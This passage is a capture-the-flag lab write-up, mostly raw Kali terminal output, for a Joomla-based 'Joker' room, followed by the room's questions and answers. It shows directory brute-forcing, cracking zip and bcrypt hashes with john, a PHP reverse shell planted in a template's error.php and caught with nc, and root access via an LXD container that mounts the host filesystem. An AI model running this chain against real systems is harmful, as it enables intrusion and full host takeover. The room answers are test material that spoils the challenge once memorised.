        rustbuster dir -u http://localhost:3000/ -w examples/wordlist -e php
    2. Dns mode:
        rustbuster dns -d google.com -w examples/wordlist
    3. Vhost mode:
        rustbuster vhost -u http://localhost:3000/ -w examples/wordlist -d test.local -x "Hello"
    4. Fuzz mode:
        rustbuster fuzz -u http://localhost:3000/login \
            -X POST \
            -H "Content-Type: application/json" \
            -b '{"user":"FUZZ","password":"FUZZ","csrf":"CSRFCSRF"}' \
            -w examples/wordlist \
            -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt \
            -s 200 \
            --csrf-url "http://localhost:3000/csrf" \
            --csrf-regex '\{"csrf":"(\w+)"\}'
    5. Tilde mode:
        rustbuster tilde -u http://localhost:3000/ -e aspx -X OPTIONS

┌──(witty㉿kali)-[~/Downloads]
└─$ mv rustbuster-v3.0.3-x86_64-unknown-linux-gnu rustbuster 

┌──(witty㉿kali)-[~/Downloads]
└─$ ./rustbuster dir -H "Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=gq1c2tl4lq49h2rv2p7gfir6j2; 0d073d2ec68ac2f24f859831bbe8843b=1ecph8o40ul8om1nmk81vpd872" --url http://10.10.230.190:8080/ -e bak,old,tar,gz,tgz,zip,7z --wordlist /usr/share/wordlists/dirb/common.txt -t 64 -s 200
 WARN  rustbuster::args > Your terminal is 82 cols wide and 13 lines tall
 WARN  rustbuster::args > Disabling progress bar, minimum cols: 104
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2023-03-10 16:46:35

GET	200 OK				http://10.10.230.190:8080/backup
GET	200 OK				http://10.10.230.190:8080/backup.zip
^C

:)

like rustscan really quickly

┌──(witty㉿kali)-[~/Downloads]
└─$ wget -h                              
GNU Wget 1.21.3, a non-interactive network retriever.
Usage: wget [OPTION]... [URL]...

Mandatory arguments to long options are mandatory for short options too.

Startup:
  -V,  --version                   display the version of Wget and exit
  -h,  --help                      print this help
  -b,  --background                go to background after startup
  -e,  --execute=COMMAND           execute a `.wgetrc'-style command

Logging and input file:
  -o,  --output-file=FILE          log messages to FILE
  -a,  --append-output=FILE        append messages to FILE
  -d,  --debug                     print lots of debugging information
  -q,  --quiet                     quiet (no output)
  -v,  --verbose                   be verbose (this is the default)
  -nv, --no-verbose                turn off verboseness, without being quiet
       --report-speed=TYPE         output bandwidth as TYPE.  TYPE can be bits
  -i,  --input-file=FILE           download URLs found in local or external FILE
  -F,  --force-html                treat input file as HTML
  -B,  --base=URL                  resolves HTML input-file links (-i -F)
                                     relative to URL
       --config=FILE               specify config file to use
       --no-config                 do not read any config file
       --rejected-log=FILE         log reasons for URL rejection to FILE

Download:
  -t,  --tries=NUMBER              set number of retries to NUMBER (0 unlimits)
       --retry-connrefused         retry even if connection is refused
       --retry-on-http-error=ERRORS    comma-separated list of HTTP errors to retry
  -O,  --output-document=FILE      write documents to FILE
  -nc, --no-clobber                skip downloads that would download to
                                     existing files (overwriting them)
       --no-netrc                  don't try to obtain credentials from .netrc
  -c,  --continue                  resume getting a partially-downloaded file
       --start-pos=OFFSET          start downloading from zero-based position OFFSET
       --progress=TYPE             select progress gauge type
       --show-progress             display the progress bar in any verbosity mode
  -N,  --timestamping              don't re-retrieve files unless newer than
                                     local
       --no-if-modified-since      don't use conditional if-modified-since get
                                     requests in timestamping mode
       --no-use-server-timestamps  don't set the local file's timestamp by
                                     the one on the server
  -S,  --server-response           print server response
       --spider                    don't download anything
  -T,  --timeout=SECONDS           set all timeout values to SECONDS
       --dns-timeout=SECS          set the DNS lookup timeout to SECS
       --connect-timeout=SECS      set the connect timeout to SECS
       --read-timeout=SECS         set the read timeout to SECS
  -w,  --wait=SECONDS              wait SECONDS between retrievals
                                     (applies if more then 1 URL is to be retrieved)
       --waitretry=SECONDS         wait 1..SECONDS between retries of a retrieval
                                     (applies if more then 1 URL is to be retrieved)
       --random-wait               wait from 0.5*WAIT...1.5*WAIT secs between retrievals
                                     (applies if more then 1 URL is to be retrieved)
       --no-proxy                  explicitly turn off proxy
  -Q,  --quota=NUMBER              set retrieval quota to NUMBER
       --bind-address=ADDRESS      bind to ADDRESS (hostname or IP) on local host
       --limit-rate=RATE           limit download rate to RATE
       --no-dns-cache              disable caching DNS lookups
       --restrict-file-names=OS    restrict chars in file names to ones OS allows
       --ignore-case               ignore case when matching files/directories
  -4,  --inet4-only                connect only to IPv4 addresses
  -6,  --inet6-only                connect only to IPv6 addresses
       --prefer-family=FAMILY      connect first to addresses of specified family,
                                     one of IPv6, IPv4, or none
       --user=USER                 set both ftp and http user to USER
       --password=PASS             set both ftp and http password to PASS
       --ask-password              prompt for passwords
       --use-askpass=COMMAND       specify credential handler for requesting 
                                     username and password.  If no COMMAND is 
                                     specified the WGET_ASKPASS or the SSH_ASKPASS 
                                     environment variable is used.
       --no-iri                    turn off IRI support
       --local-encoding=ENC        use ENC as the local encoding for IRIs
       --remote-encoding=ENC       use ENC as the default remote encoding
       --unlink                    remove file before clobber
       --xattr                     turn on storage of metadata in extended file attributes

Directories:
  -nd, --no-directories            don't create directories
  -x,  --force-directories         force creation of directories
  -nH, --no-host-directories       don't create host directories
       --protocol-directories      use protocol name in directories
  -P,  --directory-prefix=PREFIX   save files to PREFIX/..
       --cut-dirs=NUMBER           ignore NUMBER remote directory components

HTTP options:
       --http-user=USER            set http user to USER
       --http-password=PASS        set http password to PASS
       --no-cache                  disallow server-cached data
       --default-page=NAME         change the default page name (normally
                                     this is 'index.html'.)
  -E,  --adjust-extension          save HTML/CSS documents with proper extensions
       --ignore-length             ignore 'Content-Length' header field
       --header=STRING             insert STRING among the headers
       --compression=TYPE          choose compression, one of auto, gzip and none. (default: none)
       --max-redirect              maximum redirections allowed per page
       --proxy-user=USER           set USER as proxy username
       --proxy-password=PASS       set PASS as proxy password
       --referer=URL               include 'Referer: URL' header in HTTP request
       --save-headers              save the HTTP headers to file
  -U,  --user-agent=AGENT          identify as AGENT instead of Wget/VERSION
       --no-http-keep-alive        disable HTTP keep-alive (persistent connections)
       --no-cookies                don't use cookies
       --load-cookies=FILE         load cookies from FILE before session
       --save-cookies=FILE         save cookies to FILE after session
       --keep-session-cookies      load and save session (non-permanent) cookies
       --post-data=STRING          use the POST method; send STRING as the data
       --post-file=FILE            use the POST method; send contents of FILE
       --method=HTTPMethod         use method "HTTPMethod" in the request
       --body-data=STRING          send STRING as data. --method MUST be set
       --body-file=FILE            send contents of FILE. --method MUST be set
       --content-disposition       honor the Content-Disposition header when
                                     choosing local file names (EXPERIMENTAL)
       --content-on-error          output the received content on server errors
       --auth-no-challenge         send Basic HTTP authentication information
                                     without first waiting for the server's
                                     challenge

HTTPS (SSL/TLS) options:
       --secure-protocol=PR        choose secure protocol, one of auto, SSLv2,
                                     SSLv3, TLSv1, TLSv1_1, TLSv1_2, TLSv1_3 and PFS
       --https-only                only follow secure HTTPS links
       --no-check-certificate      don't validate the server's certificate
       --certificate=FILE          client certificate file
       --certificate-type=TYPE     client certificate type, PEM or DER
       --private-key=FILE          private key file
       --private-key-type=TYPE     private key type, PEM or DER
       --ca-certificate=FILE       file with the bundle of CAs
       --ca-directory=DIR          directory where hash list of CAs is stored
       --crl-file=FILE             file with bundle of CRLs
       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
                                   of base64 encoded sha256 hashes preceded by
                                   'sha256//' and separated by ';', to verify
                                   peer against

       --ciphers=STR           Set the priority string (GnuTLS) or cipher list string (OpenSSL) directly.
                                   Use with care. This option overrides --secure-protocol.
                                   The format and syntax of this string depend on the specific SSL/TLS engine.
HSTS options:
       --no-hsts                   disable HSTS
       --hsts-file                 path of HSTS database (will override default)

FTP options:
       --ftp-user=USER             set ftp user to USER
       --ftp-password=PASS         set ftp password to PASS
       --no-remove-listing         don't remove '.listing' files
       --no-glob                   turn off FTP file name globbing
       --no-passive-ftp            disable the "passive" transfer mode
       --preserve-permissions      preserve remote file permissions
       --retr-symlinks             when recursing, get linked-to files (not dir)

FTPS options:
       --ftps-implicit                 use implicit FTPS (default port is 990)
       --ftps-resume-ssl               resume the SSL/TLS session started in the control connection when
                                         opening a data connection
       --ftps-clear-data-connection    cipher the control channel only; all the data will be in plaintext
       --ftps-fallback-to-ftp          fall back to FTP if FTPS is not supported in the target server
WARC options:
       --warc-file=FILENAME        save request/response data to a .warc.gz file
       --warc-header=STRING        insert STRING into the warcinfo record
       --warc-max-size=NUMBER      set maximum size of WARC files to NUMBER
       --warc-cdx                  write CDX index files
       --warc-dedup=FILENAME       do not store records listed in this CDX file
       --no-warc-compression       do not compress WARC files with GZIP
       --no-warc-digests           do not calculate SHA1 digests
       --no-warc-keep-log          do not store the log file in a WARC record
       --warc-tempdir=DIRECTORY    location for temporary files created by the
                                     WARC writer

Recursive download:
  -r,  --recursive                 specify recursive download
  -l,  --level=NUMBER              maximum recursion depth (inf or 0 for infinite)
       --delete-after              delete files locally after downloading them
  -k,  --convert-links             make links in downloaded HTML or CSS point to
                                     local files
       --convert-file-only         convert the file part of the URLs only (usually known as the basename)
       --backups=N                 before writing file X, rotate up to N backup files
  -K,  --backup-converted          before converting file X, back up as X.orig
  -m,  --mirror                    shortcut for -N -r -l inf --no-remove-listing
  -p,  --page-requisites           get all images, etc. needed to display HTML page
       --strict-comments           turn on strict (SGML) handling of HTML comments

Recursive accept/reject:
  -A,  --accept=LIST               comma-separated list of accepted extensions
  -R,  --reject=LIST               comma-separated list of rejected extensions
       --accept-regex=REGEX        regex matching accepted URLs
       --reject-regex=REGEX        regex matching rejected URLs
       --regex-type=TYPE           regex type (posix|pcre)
  -D,  --domains=LIST              comma-separated list of accepted domains
       --exclude-domains=LIST      comma-separated list of rejected domains
       --follow-ftp                follow FTP links from HTML documents
       --follow-tags=LIST          comma-separated list of followed HTML tags
       --ignore-tags=LIST          comma-separated list of ignored HTML tags
  -H,  --span-hosts                go to foreign hosts when recursive
  -L,  --relative                  follow relative links only
  -I,  --include-directories=LIST  list of allowed directories
       --trust-server-names        use the name specified by the redirection
                                     URL's last component
  -X,  --exclude-directories=LIST  list of excluded directories
  -np, --no-parent                 don't ascend to the parent directory

Email bug reports, questions, discussions to <bug-wget@gnu.org>
and/or open issues at https://savannah.gnu.org/bugs/?func=additem&group=wget.

┌──(witty㉿kali)-[~/Downloads]
└─$ wget --user=joker --password=hannah http://10.10.230.190:8080/backup.zip
--2023-03-10 16:51:04--  http://10.10.230.190:8080/backup.zip
Connecting to 10.10.230.190:8080... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm=" Please enter the password."
Reusing existing connection to 10.10.230.190:8080.
HTTP request sent, awaiting response... 200 OK
Length: 12133560 (12M) [application/zip]
Saving to: ‘backup.zip’

backup.zip           100%[====================>]  11.57M   717KB/s    in 18s     

2023-03-10 16:51:22 (664 KB/s) - ‘backup.zip’ saved [12133560/12133560]

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir backups                                            
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ mv backup.zip /home/witty/Downloads/backups  
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd backups              
                                                                                  
┌──(witty㉿kali)-[~/Downloads/backups]
└─$ ls
backup.zip

┌──(witty㉿kali)-[~/Downloads/backups]
└─$ unzip backup.zip 
Archive:  backup.zip
   creating: db/
[backup.zip] db/joomladb.sql password: 
password incorrect--reenter:   

┌──(witty㉿kali)-[~/Downloads/backups]
└─$ zip2john backup.zip > hash


┌──(witty㉿kali)-[~/Downloads/backups]
└─$ cat hash            
backup.zip:$pkzip$8*1*1*0*0*1c*433a*6c2b37f221efe3d1f3cf416386a69e390b2d5cbdaf4c820dfdeed1c2*1*0*0*21*433a*3a1cf51b86e90000c96583ff28c3f66967627db8eb898947aefffbbf14d2d79afa*1*0*0*24*433b*e72d627b8f09c0b28e777a603b72dfe046d7928a2fad76ae291785873c827a5c76158220*1*0*0*24*433b*4612436e78ed4312b2183316d6c6d38376bee4ef1163039f3106650d09fd16dc1dd30681*1*0*8*24*433a*83046150d21c4832d6fc5ba494d8d6f79bcfa76e5919c5a97bcf890f06d2e540e258f9a3*1*0*8*24*433b*c50910b2036c8e097d626a162570c843e793af7df0bab242d73e98ee1a71c036588be383*1*0*8*24*433a*ace94169c2a3465b235e408520eaf5701e867474d6a32f2aa179972c95d4cf5e29942319*2*0*13*7*ebd78eb7*1beea*6b*0*13*433a*42420120b0cb36a12b6c31737d25a0f56d777d*$/pkzip$::backup.zip:site/libraries/vendor/phpmailer/phpmailer/VERSION, site/libraries/fof/version.txt, site/media/jui/js/jquery-noconflict.js, site/templates/protostar/error.php, site/templates/beez3/error.php, site/libraries/index.html, site/templates/index.html, site/administrator/cache/index.html:backup.zip

┌──(witty㉿kali)-[~/Downloads/backups]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hannah           (backup.zip)     
1g 0:00:00:00 DONE (2023-03-10 16:56) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

──(witty㉿kali)-[~/Downloads/backups]
└─$ unzip backup.zip
Archive:  backup.zip
   creating: db/
[backup.zip] db/joomladb.sql password: 
  inflating: db/joomladb.sql         
   creating: site/
   creating: site/libraries/
   creating: site/libraries/phpass/
  inflating: site/libraries/phpass/PasswordHash.php  
....

┌──(witty㉿kali)-[~/Downloads/backups]
└─$ cd site         
                                                                                  
┌──(witty㉿kali)-[~/Downloads/backups/site]
└─$ ls
administrator  configuration.php  language     modules     tmp
bin            htaccess.txt       layouts      plugins     web.config.txt
cache          images             libraries    README.txt
cli            includes           LICENSE.txt  robots.txt
components     index.php          media        templates
                                                                                  
┌──(witty㉿kali)-[~/Downloads/backups/site]
└─$ head -n20 configuration.php 
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'joker';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = '1234';
	public $db = 'joomladb';
	public $dbprefix = 'cc1gr_';
	public $live_site = '';

┌──(witty㉿kali)-[~/Downloads/backups]
└─$ cd db 
                                                                                  
┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ ls
joomladb.sql

┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ more joomladb.sql                           
-- MySQL dump 10.13  Distrib 5.7.27, for Linux (x86_64)
--
-- Host: localhost    Database: joomladb
-- ------------------------------------------------------
-- Server version	5.7.27-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */
;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `cc1gr_assets`
--

DROP TABLE IF EXISTS `cc1gr_assets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cc1gr_assets` (

┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ grep CREATE TABLE joomladb.sql | grep user
grep: TABLE: No such file or directory
joomladb.sql:CREATE TABLE `cc1gr_user_keys` (
joomladb.sql:CREATE TABLE `cc1gr_user_notes` (
joomladb.sql:CREATE TABLE `cc1gr_user_profiles` (
joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` (
joomladb.sql:CREATE TABLE `cc1gr_usergroups` (
joomladb.sql:CREATE TABLE `cc1gr_users` (

┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ grep cc1gr_users joomladb.sql 
-- Table structure for table `cc1gr_users`
DROP TABLE IF EXISTS `cc1gr_users`;
CREATE TABLE `cc1gr_users` (
-- Dumping data for table `cc1gr_users`
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;

┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash
                                                                                  
┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abcd1234         (?)     
1g 0:00:00:11 DONE (2023-03-10 17:03) 0.08474g/s 88.47p/s 88.47c/s 88.47C/s bullshit..piolin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

admin:abcd1234

From the Control Panel go to `Configuration > Templates > Templates > Beez3 Details and Files`. Click on `error.php`

uploading ivan php

visit the error page http://10.10.134.191:8080/templates/beez3/error.php 
You should now have a reverse shell.

┌──(witty㉿kali)-[~/Downloads/backups/db]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.134.191] 36412
SOCKET: Shell has connected! PID: 928
SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/opt/joomla/templates/beez3$ whoami
whoami
www-data
www-data@ubuntu:/opt/joomla/templates/beez3$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)

www-data@ubuntu:/opt/joomla/templates/beez3$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ ls
ls
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+-------+--------------+--------+-------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------+--------+--------+------------------------------+
|       | a8258f4a885f | no     |             | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
+-------+--------------+--------+-------------+--------+--------+------------------------------+

┌──(witty㉿kali)-[~/Downloads/lxd-alpine-builder]
└─$ python3 -m http.server 1234            
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.134.191 - - [10/Mar/2023 17:23:44] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -

www-data@ubuntu:/tmp$ wget http://10.8.19.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
<9.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2023-03-10 14:23:44--  http://10.8.19.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'

alpine-v3.13-x86_64 100%[===================>]   3.11M   885KB/s    in 3.6s    

2023-03-10 14:23:48 (885 KB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]

www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 10, 2023 at 10:24pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+

www-data@ubuntu:/tmp$ lxc init myimage alpine -c security.privileged=true
lxc init myimage alpine -c security.privileged=true
Creating alpine
www-data@ubuntu:/tmp$ lxc config device add alpine mydevice disk source=/ path=/mnt/root/ recursive=true
<device disk source=/ path=/mnt/root/ recursive=true
Device mydevice added to alpine
www-data@ubuntu:/tmp$ lxc start alpine
lxc start alpine
www-data@ubuntu:/tmp$ lxc exec alpine /bin/sh
lxc exec alpine /bin/sh
~ # id
id
uid=0(root) gid=0(root)

~ # cd  /mnt/root/root/
cd  /mnt/root/root/
/mnt/root/root # ls
ls
final.txt
/mnt/root/root # cat final.txt
cat final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!		
							
Contact us here:						
								
Hacking Articles : https://twitter.com/rajchandel/		
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
								
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+


```

![[Pasted image 20230310130631.png]]

![[Pasted image 20230310171508.png]]

Enumerate services on target machine.  

What about nmap?


What version of Apache is it?  

*2.4.29*


What port on this machine not need to be authenticated by user and password?  

*80*

There is a file on this port that seems to be secret, what is it?  

Extensions File, dirb command comes with a flag that append each word with this extensions. Try to use dirb with a file that contains some commons extensions in a web server.

*secret.txt*

There is another file which reveals information of the backend, what is it?  

*phpinfo.php*

When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?  

*joker*


What port on this machine need to be authenticated by Basic Authentication Mechanism?  

*8080*


At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?  

Maybe burp with format user:pass and encode with base64? Note: Don't forget decode it!!

*hannah*

Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

Nikto with the credentials we obtained?

*/administrator/*

We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?  

*backup.zip*


We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

Use john to crack the zip hash

*hannah*

Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?  

*admin*


Super Duper User! What is the password?  

Again, john and mysql hash password.

*abcd1234*

At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?  

Maybe use error.php page on a template? Of course try it and execute 'id' command.

*www-data*


This user belongs to a group that differs on your own group, What is this group?

Linux containers

*lxd*

Spawn a tty shell.

python3


In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it online".  

 Completed

Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.  

If there isn't an image already on the box, you may need to upload one...


**The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.** Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.  

lxc init ... lxc config device ... lxc start ... lxc exec ...


What is the name of the file in the /root directory?

*final.txt*


[[OWASP Top 10 - 2021]]